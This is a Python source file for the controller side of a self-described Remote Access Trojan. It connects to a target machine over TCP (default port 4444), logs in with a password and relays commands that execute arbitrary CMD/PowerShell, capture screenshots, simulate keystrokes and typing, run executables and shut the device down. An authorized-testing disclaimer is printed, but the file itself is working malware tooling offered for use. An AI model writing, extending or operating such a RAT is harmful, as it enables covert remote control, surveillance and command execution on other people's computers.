import socket
import io
from rich import print
import pyfiglet
import time
import os
import random
from rich.console import Console
time.sleep(1)
console = Console()
help_menu = """
╔════════════════════════════════════════════════════════════╗
║                   COMMAND REFERENCE GUIDE                  ║
╠════════════════════════════════════════════════════════════╣
║                                                            ║
║  speak <text>     → Convert text to speech on target       ║
║  press <key>      → Simulate a single key press            ║
║                    👉 win, enter, tab, esc, shift, ctrl    ║
║  hotkey <k1>+<k2> → Keyboard shortcut (e.g. win+d)         ║
║  write <text>     → Type text automatically                ║
║  cmd <command>    → Execute CMD/PowerShell commands        ║
║  ss               → Capture target screenshot              ║
║  help             → Show this help menu                    ║
║  clear            → Clear terminal screen                  ║
║  exit             → Disconnect and exit                    ║
║  shutdown         → Shutdown The Target device             ║                                         
║  run (file_path.exe) →    Runs The specific exe file       ║
║                            on target device with the help  ║
║                            of file path                    ║                                                                                ║
║                                                            ║
╚════════════════════════════════════════════════════════════╝
"""

# Disclaimer
disclaimer= """
╔══════════════════════════════════════════════════════════════╗
║  ⚠️  DISCLAIMER                                              ║
╠══════════════════════════════════════════════════════════════╣
║  This tool is intended for educational & authorized          ║
║  penetration testing ONLY. Use only on systems you own       ║
║  or have explicit permission to test.                        ║
║  Unauthorized access is ILLEGAL.                             ║
║  The developer assumes NO liability for misuse.              ║
╚══════════════════════════════════════════════════════════════╝
"""

print(f"[red]{disclaimer}[/red]")
time.sleep(1)

before = """📌 BEFORE RUNNING

Before starting this software, make sure that all configuration settings are correct and that the application is being used only in a properly authorized testing environment.

Verify that the Rat.exe file is running on the target device(Your device) and all the required modules  are installed and running correctly on systems that you own or are explicitly authorized to test. Incorrect configuration may prevent the software from functioning as expected.

Use this software responsibly and only for lawful and ethical purposes.
"""

print(f"[blue]{before}[/blue]")
time.sleep(1)

run = str(input("Do you want to run this tool (y/n) : ")).lower()
if run == "y":
    osname = str(console.input("""[bold white]Enter Your Os Name[/bold white]
                   1. [blue]Windows[/blue]
                   2. [red]Mac/linux[/red]    [white](1/2) : [/white]"""))
    print("[bold blue]Running....[/bold blue]")
    time.sleep(2)
    if osname == "1":
        os.system("cls")
    elif osname == "2":
        os.system("clear")
    name = pyfiglet.figlet_format("""Remote Access Trojan                             [ RAT ]""", font="small")
    print(f"[bold red]{name}[/bold red]")
    time.sleep(1)
    print("[bold yellow]Use Only for educational purpose[/bold yellow]")
    time.sleep(1)
    print("""[bold blue]Made By : Akshat Rajput[/bold blue]                                [bold blue]Version : v1.5[/bold blue]""")
    time.sleep(1)
    print("[bold blue]Working OS : Windows/Linux[/bold blue]")
    print("")
    print("[bold red]GitHub:[/bold red]")
    print("[bold blue]https://github.com/akshatrajput817/[/bold blue]\n")

    print("[bold red]LinkedIn:[/bold red]")
    print("[bold blue]https://www.linkedin.com/in/akshat-rajput-53429b396/[/bold blue]\n")

    print("[bold red]YouTube Channel:[/bold red]")
    print("[bold blue]https://www.youtube.com/channel/UCO8Cf8Rg9VZG8wz0pfdI64A[/bold blue]")
    print("")
    time.sleep(1)
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ip_input =  str(console.input("[bold red]Enter The Target Ip : [/bold red]"))
    port_input =  str(console.input("[bold red]Enter The Target Port Enter for Default Port(4444) : [/bold red]"))
    ip =  ip_input
    if port_input == "":
        port = 4444
    else:
        port = int(port_input)
    print("""[bold white]Basic Information---
          Type = "help" for help
          Type = "exit" for quit
          Type = "clear" for clear the terminal[bold white]""")
    client.connect((ip, port))
    password = input("Enter the password : ")
    client.send(password.encode())
    info = client.recv(4096).decode("utf-8")
    if info == "Succesfully Login---":
       print(f"[bold green]{info}[/bold green]")
    else:
        print(f"[bold red]{info}[/bold red]")
    while True:
        try:
            while True:
                cmd = console.input("[bold white]Enter command: [/bold white]")
                client.send(cmd.encode("utf-8"))
                if cmd == "exit":
                    client.close()
                if cmd == "help":
                    print(f"[bold white]{help_menu}[/bold white]")
                if cmd == "clear":
                    if osname == "1":
                       os.system("cls")
                    elif osname == "2":
                        os.system("clear")
                    else:
                        break      
                if cmd=="ss":
                    data = b""
                    packet = client.recv(4111096)
                    data+=packet
                    with open("screen.png", "wb") as f:
                        f.write(data)
                if cmd.startswith("cmd"):
                     output = client.recv(10240).decode("utf-8")
                     print(output)
                if cmd.startswith("press"):
                    output1 = client.recv(1024).decode("utf-8")
                    print(f"[bold green]{output1}[bold green]")
                if cmd.startswith("write"):
                    output2 = client.recv(1024).decode("utf-8")
                    print(f"[bold green]{output2}[bold green]")
                if cmd.startswith("hotkey"):
                    output3 = client.recv(1024).decode("utf-8")
                    print(f"[bold green]{output3}[bold green]")
                    # speak
                if cmd.startswith("speak"):
                    output4 = client.recv(1024).decode("utf-8")
                    print(f"[bold green]{output4}[bold green]")
                if cmd.startswith("shutdown"):
                    output5 = client.recv(1024).decode("utf-8")
                    print(f"[bold green]{output4}[bold green]")

        except Exception as e:
            print(f"Error : {e}")    
    client.close()
else:
    print("[bold blue]Thanks for using[/bold blue]")
